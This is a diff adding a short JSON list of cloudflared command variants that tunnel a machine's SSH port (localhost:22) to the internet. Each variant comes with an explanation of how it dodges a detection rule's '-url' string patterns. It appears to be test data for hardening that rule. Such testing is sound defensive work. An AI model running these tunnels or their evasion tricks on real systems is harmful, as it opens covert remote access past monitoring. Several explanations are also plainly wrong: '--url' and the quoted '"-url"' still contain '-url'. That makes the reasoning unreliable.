@@ -1,0 +1,18 @@
+[
+  {
+    "output": "C:\\Tools\\cloudflared.exe tunnel --url http://localhost:22",
+    "explanation": "Substitution technique: Cloudflared accepts both single hyphens ('-url') and double hyphens ('--url') for its command-line flags. Substituting '-url' with '--url' evades the first pattern block in 'selection_param' ('-url' and 'tunnel'), but still satisfies the standalone validation context."
+  },
+  {
+    "output": "C:\\Tools\\cloudflared.exe tunnel \"-url\" http://localhost:22",
+    "explanation": "Insertion technique: Enclosing the flag string token in double quotes ('\"-url\"') disrupts the continuous substring verification sequence matching '-url' or '.exe -url'. The application seamlessly evaluates and strips the outer quotes at runtime execution initialization, keeping the quick tunnel behavior equivalent."
+  },
+  {
+    "output": "cmd.exe /c C:\\Tools\\cloudflared.exe tunnel -u^rl http://localhost:22",
+    "explanation": "Insertion technique: Running the instruction sequence inside cmd.exe allows the placement of a caret string escape character ('^') directly into the flag parameter name. The shell strips this symbol out automatically before invoking the binary, resulting in a logged token of '-u^rl' which successfully evades the linear string filters."
+  },
+  {
+    "output": "C:\\Tools\\cloudflared.exe tunnel\t-url\thttp://localhost:22",
+    "explanation": "Substitution technique: Replacing the structural white space characters flanking the parameters with horizontal tab characters ('\\t'). The native Windows operating system decodes tabs as standard parameter delimiters, which safely undermines static string normalization expectations like '.exe -url' that enforce strict space configurations."
+  }
+]
